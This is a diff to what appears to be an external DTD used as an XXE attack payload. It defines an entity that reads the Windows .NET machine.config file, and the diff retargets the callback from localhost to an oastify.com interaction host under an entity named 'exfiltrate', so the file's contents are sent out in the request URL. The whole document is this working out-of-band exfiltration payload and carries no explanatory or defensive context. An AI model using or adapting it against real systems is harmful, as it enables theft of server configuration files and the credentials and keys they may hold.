@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config">
-<!ENTITY % eval "<!ENTITY &#x25; ssrf SYSTEM 'http://127.0.0.1:80/?data=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://jk7z8vw2vnor48f0jp8hisfkobu4iv6k.oastify.com/?content=%file;'>">
 %eval;
-%ssrf;
+%exfiltrate;
